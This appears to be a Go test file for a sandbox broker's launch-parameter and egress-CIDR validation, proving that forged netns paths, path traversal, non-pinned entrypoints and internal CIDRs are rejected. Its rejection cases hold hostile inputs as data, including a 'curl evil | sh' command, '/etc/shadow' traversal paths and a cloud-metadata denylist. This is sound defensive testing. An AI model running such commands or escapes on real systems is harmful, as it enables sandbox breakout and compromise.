//go:build linux

package sandbox

import (
	"strings"
	"testing"
)

// validParams returns a LaunchParams that passes ValidateLaunchParams, so
// each rejection test can mutate exactly one field and prove that field's
// gate — the boundary the broker enforces before it builds or execs
// anything from an orchestrator's request.
func validParams() LaunchParams {
	return LaunchParams{
		RunID:       "run-abc123",
		ContainerID: "tf-abc123-1",
		Rootfs:      RootfsSelector{Name: "base"},
		Env: []EnvVar{
			{Key: "PATH", Value: "/usr/bin"},
			{Key: "ANTHROPIC_BASE_URL", Value: "http://10.42.1.1:9000"},
			{Key: "GIT_CONFIG_KEY_0", Value: "core.hooksPath"},
			{Key: "GIT_CONFIG_VALUE_0", Value: "/hooks"},
		},
		Args:      []string{sandboxNodeBinary, sandboxWrapperEntry, "-p", "hi"},
		Worktree:  "/data/worktrees/run-abc123",
		SDKDir:    "/opt/tf/sdk",
		Rlimits:   []Rlimit{{Type: "RLIMIT_NOFILE", Soft: 1024, Hard: 1024}},
		NetnsPath: "/var/run/netns/tf-abc123-1",
	}
}

func TestValidateLaunchParams_AcceptsValid(t *testing.T) {
	if err := ValidateLaunchParams(validParams()); err != nil {
		t.Fatalf("ValidateLaunchParams rejected valid params: %v", err)
	}
	// The empty rootfs selector resolves to "base" and must also pass.
	p := validParams()
	p.Rootfs = RootfsSelector{}
	if err := ValidateLaunchParams(p); err != nil {
		t.Errorf("empty rootfs selector rejected: %v", err)
	}
}

// TestValidateLaunchParams_RejectsBadRootfsName is the "bad rootfs name"
// acceptance rejection: a name outside the broker's curated catalog fails.
func TestValidateLaunchParams_RejectsBadRootfsName(t *testing.T) {
	p := validParams()
	p.Rootfs = RootfsSelector{Name: "totally-not-a-variant"}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted an unknown rootfs variant; want rejection")
	}
}

// TestValidateLaunchParams_RejectsPathShapedRootfs is the "path-shaped
// param" rejection: a rootfs SELECTOR that carries path structure (a
// would-be rootfs path) is rejected before the catalog lookup, so the
// broker never mounts an orchestrator-supplied path as the root.
func TestValidateLaunchParams_RejectsPathShapedRootfs(t *testing.T) {
	for _, name := range []string{"/host/evil", "../../etc", "a/b", "base/../x", ".hidden", "bad name"} {
		p := validParams()
		p.Rootfs = RootfsSelector{Name: name}
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted path-shaped rootfs selector %q; want rejection", name)
		}
	}
}

// TestValidateLaunchParams_RejectsPathShapedID pins that a run/container id
// carrying path structure (which would seed the bundle dir / netns / cgroup
// name) is rejected.
func TestValidateLaunchParams_RejectsPathShapedID(t *testing.T) {
	for _, id := range []string{"../escape", "a/b", "", "c\x00d"} {
		p := validParams()
		p.ContainerID = id
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted path-shaped container id %q; want rejection", id)
		}
	}
}

// TestValidateLaunchParams_RejectsNonAllowlistedEnvKey is the
// "non-allowlisted env key" rejection: a key outside the enumerated union
// fails the launch loudly, while an allowlisted key and a numbered
// GIT_CONFIG_* prefix key pass.
func TestValidateLaunchParams_RejectsNonAllowlistedEnvKey(t *testing.T) {
	p := validParams()
	p.Env = append(p.Env, EnvVar{Key: "EVIL_INJECTED_KEY", Value: "x"})
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a non-allowlisted env key; want rejection")
	}

	// Sanity: the allowlisted set (incl. a numbered prefix key) passes.
	ok := validParams()
	ok.Env = []EnvVar{
		{Key: "HOME", Value: "/work"},
		{Key: "ANTHROPIC_API_KEY", Value: "placeholder"},
		{Key: "GIT_CONFIG_KEY_7", Value: "url./.insteadOf"},
		{Key: "TF_GIT_PUSH_CAPTURE", Value: "proxy"},
	}
	if err := ValidateLaunchParams(ok); err != nil {
		t.Errorf("allowlisted env keys rejected: %v", err)
	}
}

// TestValidateLaunchParams_RejectsNonPinnedEntrypoint pins that the broker
// owns the command: argv whose first two elements aren't the fixed
// node+wrapper entrypoint is rejected, so a compromised orchestrator can
// vary arguments but never the executed program.
func TestValidateLaunchParams_RejectsNonPinnedEntrypoint(t *testing.T) {
	for _, argv := range [][]string{
		{"/bin/sh", "-c", "curl evil | sh"},
		{sandboxNodeBinary, "/tmp/evil.js"},
		{sandboxWrapperEntry},
		nil,
	} {
		p := validParams()
		p.Args = argv
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted non-pinned entrypoint %v; want rejection", argv)
		}
	}
}

// TestValidateLaunchParams_RejectsForgedNetns pins that a netns path that is
// not one of the broker's own per-run namespaces is rejected — closing the
// escalation where a compromised orchestrator points the sandbox at the host
// netns (bypassing the per-run egress allowlist).
func TestValidateLaunchParams_RejectsForgedNetns(t *testing.T) {
	for _, path := range []string{
		"",
		"/proc/1/ns/net",
		"/var/run/netns/hostnet",
		"/etc/passwd",
		"/var/run/netns/../../etc/shadow",
	} {
		p := validParams()
		p.NetnsPath = path
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted forged netns path %q; want rejection", path)
		}
	}
}

// TestValidateLaunchParams_RejectsBadRlimit pins the rlimit boundary: an
// unlisted type, a soft limit above the hard limit, and a duplicated type
// are all rejected.
func TestValidateLaunchParams_RejectsBadRlimit(t *testing.T) {
	cases := map[string][]Rlimit{
		"unlisted type": {{Type: "RLIMIT_MEMLOCK", Soft: 1, Hard: 1}},
		"soft > hard":   {{Type: "RLIMIT_NOFILE", Soft: 2048, Hard: 1024}},
		"duplicate type": {
			{Type: "RLIMIT_NOFILE", Soft: 1024, Hard: 1024},
			{Type: "RLIMIT_NOFILE", Soft: 512, Hard: 512},
		},
	}
	for name, rl := range cases {
		p := validParams()
		p.Rlimits = rl
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("%s: accepted a bad rlimit set; want rejection", name)
		}
	}
}

// TestValidateLaunchParams_RejectsNonAbsolutePaths pins that the paths the
// broker binds (worktree, sdk, mount source/destination) must be clean
// absolute paths — caught at the boundary, not late inside runsc.
func TestValidateLaunchParams_RejectsNonAbsolutePaths(t *testing.T) {
	worktree := validParams()
	worktree.Worktree = "relative/worktree"
	if err := ValidateLaunchParams(worktree); err == nil {
		t.Error("accepted a relative worktree; want rejection")
	}

	unclean := validParams()
	unclean.SDKDir = "/opt/tf/../tf/sdk"
	if err := ValidateLaunchParams(unclean); err == nil {
		t.Error("accepted a non-clean sdk dir; want rejection")
	}

	relSource := validParams()
	relSource.Mounts = []Mount{{Source: "rel/src", Destination: "/work/x"}}
	if err := ValidateLaunchParams(relSource); err == nil {
		t.Error("accepted a relative mount source; want rejection")
	}
}

// TestValidateLaunchParams_RejectsBadMountOption pins that a mount option
// outside the honored ro/rw set is rejected, so a caller can't slip a
// surprising mount flag into the broker-built spec.
func TestValidateLaunchParams_RejectsBadMountOption(t *testing.T) {
	p := validParams()
	p.Mounts = []Mount{{Source: "/host/x", Destination: "/work/x", Options: []string{"suid"}}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted an unsupported mount option; want rejection")
	}
	// ro/rw (and no options) are honored.
	for _, opts := range [][]string{nil, {"ro"}, {"rw"}} {
		ok := validParams()
		ok.Mounts = []Mount{{Source: "/host/x", Destination: "/work/x", Options: opts}}
		if err := ValidateLaunchParams(ok); err != nil {
			t.Errorf("mount options %v rejected: %v", opts, err)
		}
	}
}

// TestValidateLaunchParams_RejectsMalformedEnvEntry pins the env-entry
// boundary beyond the allowlist: an empty key, a key carrying '=' or NUL,
// and a value carrying NUL are all rejected so the broker never folds a
// misparsing entry into the spec.
func TestValidateLaunchParams_RejectsMalformedEnvEntry(t *testing.T) {
	cases := map[string]EnvVar{
		"empty key":   {Key: "", Value: "x"},
		"key has =":   {Key: "HO=ME", Value: "x"},
		"key has NUL": {Key: "HO\x00ME", Value: "x"},
		"value NUL":   {Key: "HOME", Value: "a\x00b"},
	}
	for name, e := range cases {
		p := validParams()
		p.Env = append(p.Env, e)
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("%s: accepted a malformed env entry; want rejection", name)
		}
	}
}

// TestValidateEgressCIDR_DenylistsInternal is the "denylisted CIDR"
// acceptance rejection: the cloud metadata endpoint, the control-plane
// subnet, private/link-local ranges, and the sandbox subnet pool are all
// rejected — "validated" means *safe*, not merely well-formed. A public
// destination passes the denylist (application of an accepted CIDR is the
// self-host raw-L3 variant, tracked separately).
func TestValidateEgressCIDR_DenylistsInternal(t *testing.T) {
	denied := []struct {
		name string
		cidr string
	}{
		{"cloud metadata endpoint", "169.254.169.254"},
		{"cloud metadata range", "169.254.169.254/32"},
		{"link-local", "169.254.0.0/16"},
		{"control-plane subnet (private 10/8)", "10.0.5.0/24"},
		{"sandbox subnet pool", "10.42.7.0/24"},
		{"rfc1918 172.16/12", "172.16.30.0/24"},
		{"rfc1918 192.168/16", "192.168.1.0/24"},
		{"loopback", "127.0.0.1/32"},
		{"straddles denylist", "10.0.0.0/7"},
	}
	for _, d := range denied {
		if err := validateEgressCIDR(d.cidr); err == nil {
			t.Errorf("%s: validateEgressCIDR(%q) = nil; want rejection", d.name, d.cidr)
		}
	}

	// Empty means "no extra egress" and is a no-op, not an error.
	if err := validateEgressCIDR(""); err != nil {
		t.Errorf("empty CIDR rejected: %v", err)
	}
	// A public destination is not on the internal denylist.
	for _, ok := range []string{"203.0.113.0/24", "8.8.8.8/32"} {
		if err := validateEgressCIDR(ok); err != nil {
			t.Errorf("public CIDR %q rejected by the internal denylist: %v", ok, err)
		}
	}
	// Malformed input is rejected too.
	if err := validateEgressCIDR("not-a-cidr"); err == nil {
		t.Error("accepted a malformed CIDR; want rejection")
	}
}

// TestValidateLaunchParams_DenylistedCIDRRejected pins the same denylist at
// the whole-params boundary (the path the broker actually calls), including
// the two the acceptance names explicitly.
func TestValidateLaunchParams_DenylistedCIDRRejected(t *testing.T) {
	for _, cidr := range []string{"169.254.169.254/32", "10.0.0.0/8"} {
		p := validParams()
		p.ExtraEgressCIDR = cidr
		err := ValidateLaunchParams(p)
		if err == nil {
			t.Errorf("ValidateLaunchParams accepted denylisted egress CIDR %q", cidr)
			continue
		}
		if !strings.Contains(err.Error(), "denylist") {
			t.Errorf("egress CIDR %q rejected but not for the denylist reason: %v", cidr, err)
		}
	}
}
